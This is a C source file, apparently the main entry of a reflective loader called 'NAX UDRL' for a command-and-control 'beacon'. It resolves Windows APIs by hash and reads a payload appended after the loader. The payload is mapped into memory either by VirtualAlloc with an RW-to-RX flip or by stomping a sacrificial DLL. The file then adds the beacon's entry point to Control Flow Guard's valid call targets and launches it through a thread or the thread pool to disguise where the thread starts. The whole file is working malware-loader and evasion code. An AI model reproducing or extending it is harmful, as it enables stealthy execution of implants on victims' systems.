#include <Common.h>
#include <Constexpr.h>
#include <Loader.h>

/* ========= [ NAX UDRL - entry + dispatch ] =========
 *
 * PreMain (Stardust pattern) has already:
 *   1. Calculated Base.Buffer = StRipStart()  (loader base address)
 *   2. Calculated Base.Length = StRipEnd() - StRipStart()  (loader size)
 *   3. Resolved ntdll!RtlAllocateHeap + kernel32 TLS APIs
 *   4. Stored INSTANCE in TLS (consecutive-slot egghunter)
 *   5. Zeroed out the StRipEnd code (anti-fingerprint)
 *   6. Transferred control here via Main()
 *
 * Technique selection is compile-time via preprocessor defines:
 *
 *   NAX_STOMP_MODE:
 *     NAX_STOMP_VIRTUAL  (0) - NtAllocateVirtualMemory (private memory)
 *     NAX_STOMP_MODULE   (1) - Module stomp (image-backed, sacrificial DLL)
 *
 *   NAX_EXEC_MODE:
 *     NAX_EXEC_THREAD      (0) - CreateThread (start addr = beacon)
 *     NAX_EXEC_THREADPOOL  (1) - TpAllocWork/TpPostWork (start addr = TppWorkerThread)
 *
 * Implementation split across files:
 *   Pe.c    - PE header parsing helpers
 *   Stomp.c - Module stomping + LDR patching + unwind stomping
 *   Exec.c  - Thread pool / CreateThread execution transfer
 *   Main.c  - This file: resolve APIs, parse header, dispatch */

/* ========= [ VirtualAlloc fallback path ] ========= */

#if NAX_STOMP_MODE == NAX_STOMP_VIRTUAL

FUNC PVOID NaxAllocExec(
    _In_ PVOID BeaconSrc,
    _In_ ULONG BeaconSize ) {
    STARDUST_INSTANCE

    PVOID  exec_buf  = NULL;
    SIZE_T copy_size = ALIGN_UP( BeaconSize, LDR_PAGE_SIZE );
    ULONG  old_prot  = 0;

    if ( !NT_SUCCESS( API( NtAllocateVirtualMemory )( NtCurrentProcess(), &exec_buf, 0, &copy_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) )
        return NULL;
    if ( !exec_buf )
        return NULL;

    MmCopy( exec_buf, BeaconSrc, BeaconSize );

    if ( !API( VirtualProtect )( exec_buf, copy_size, PAGE_EXECUTE_READ, &old_prot ) )
        return NULL;

    return exec_buf;
}

#endif /* NAX_STOMP_VIRTUAL */

/* ========= [ entry - resolve APIs, parse header, dispatch ] ========= */

FUNC VOID Main(
    _In_ PVOID Param ) {
    STARDUST_INSTANCE

    PVOID  hdr       = { 0 };
    PVOID  beacon_src = { 0 };
    PVOID  entry      = { 0 };

    /* ========= [ resolve modules ] ========= */
    if ( !( MOD( Kernel32 ) = LdrModulePeb( H_MODULE_KERNEL32 ) ) )
        return;
    if ( !( MOD( Ntdll ) = LdrModulePeb( H_MODULE_NTDLL ) ) )
        return;

    /* ========= [ resolve APIs ] ========= */

    if ( !RESOLVE( NtProtectVirtualMemory, Ntdll ) ) return;
    if ( !RESOLVE( VirtualProtect, Kernel32 ) ) return;

#if NAX_STOMP_MODE == NAX_STOMP_VIRTUAL
    if ( !RESOLVE( NtAllocateVirtualMemory, Ntdll ) ) return;
#elif NAX_STOMP_MODE == NAX_STOMP_MODULE
    if ( !RESOLVE( LoadLibraryExW, Kernel32 ) ) return;

    MOD( Kernelbase ) = LdrModulePeb( H_MODULE_KERNELBASE );
    if ( MOD( Kernelbase ) ) {
        RESOLVE( GetProcessMitigationPolicy, Kernelbase );
        API( SetProcessValidCallTargets ) = (__typeof__( API( SetProcessValidCallTargets ) ))LdrFunction( MOD( Kernelbase ), HASH_STR( "SetProcessValidCallTargets" ) );
    }
#endif

#if NAX_EXEC_MODE == NAX_EXEC_THREAD
    if ( !RESOLVE( CreateThread, Kernel32 ) ) return;
#elif NAX_EXEC_MODE == NAX_EXEC_THREADPOOL
    if ( !RESOLVE( TpAllocWork,   Ntdll ) ) return;
    if ( !RESOLVE( TpPostWork,    Ntdll ) ) return;
    if ( !RESOLVE( TpReleaseWork, Ntdll ) ) return;
#endif

    /* ========= [ parse NaxHeader ] ========= */
    hdr = LOADER_END();

    ULONG magic       = HDR_U32( hdr, NAX_HDR_OFF_MAGIC );
    ULONG beacon_size = HDR_U32( hdr, NAX_HDR_OFF_BEACON_SZ );

    /* v1 fallback: if magic doesn't match v2, treat as legacy 4-byte header */
    if ( magic != NAX_HDR_MAGIC ) {
        beacon_size = magic;
        beacon_src  = C_PTR( U_PTR( hdr ) + 4 );

        if ( !beacon_size || beacon_size > 256 * 1024 )
            return;

#if NAX_STOMP_MODE == NAX_STOMP_VIRTUAL
        entry = NaxAllocExec( beacon_src, beacon_size );
#else
        entry = beacon_src;
#endif
        if ( !entry )
            return;

        ( (VOID (*)( VOID ))entry )();
        return;
    }

    /* ========= [ validate header ] ========= */
    if ( !beacon_size || beacon_size > 512 * 1024 )
        return;

    /* ========= [ locate beacon blobs + stomp ] ========= */
    beacon_src = C_PTR( U_PTR( hdr ) + NAX_HDR_SIZE );

#if NAX_STOMP_MODE == NAX_STOMP_MODULE
    ULONG  pdata_size = HDR_U32( hdr, NAX_HDR_OFF_PDATA_SZ );
    ULONG  xdata_size = HDR_U32( hdr, NAX_HDR_OFF_XDATA_SZ );
    ULONG  text_rva   = HDR_U32( hdr, NAX_HDR_OFF_TEXT_RVA );
    PWCHAR dll_name   = HDR_WSTR( hdr, NAX_HDR_OFF_DLL_NAME );
    PVOID  pdata_src  = C_PTR( U_PTR( beacon_src ) + beacon_size );
    PVOID  xdata_src  = C_PTR( U_PTR( pdata_src ) + pdata_size );

    entry = NaxModuleStomp( hdr, beacon_src, beacon_size, pdata_src, pdata_size, xdata_src, xdata_size, text_rva, dll_name );
#elif NAX_STOMP_MODE == NAX_STOMP_VIRTUAL
    entry = NaxAllocExec( beacon_src, beacon_size );
#endif

    if ( !entry )
        return;

    /* ========= [ CFG: whitelist beacon entry in stomped DLL ] ========= */
#if NAX_STOMP_MODE == NAX_STOMP_MODULE
    if ( API( GetProcessMitigationPolicy ) && API( SetProcessValidCallTargets ) && Instance()->StompDllBase ) {
        BYTE policy[4];
        MmZero( policy, 4 );
        if ( API( GetProcessMitigationPolicy )( (HANDLE)-1, LDR_PROCESS_CFG_GUARD_POLICY, policy, 4 ) && ( policy[0] & 1 ) ) {
            PIMAGE_NT_HEADERS cfgNt = NaxPeHeaders( Instance()->StompDllBase );
            if ( cfgNt ) {
                SIZE_T cfgLen = ALIGN_UP( cfgNt->OptionalHeader.SizeOfImage, LDR_PAGE_SIZE );
                struct { ULONG_PTR Offset; ULONG_PTR Flags; } cfg = { U_PTR( entry ) - U_PTR( Instance()->StompDllBase ), LDR_CFG_CALL_TARGET_VALID | LDR_CFG_CALL_TARGET_CONVERT_EXPORT };
                API( SetProcessValidCallTargets )( (HANDLE)-1, Instance()->StompDllBase, cfgLen, 1, &cfg );
            }
        }
    }
#endif

    /* ========= [ transfer execution to beacon ] ========= */
#if NAX_EXEC_MODE == NAX_EXEC_THREADPOOL
    NaxExecThreadPool( entry );
#elif NAX_EXEC_MODE == NAX_EXEC_THREAD
    NaxExecThread( entry );
#endif
}
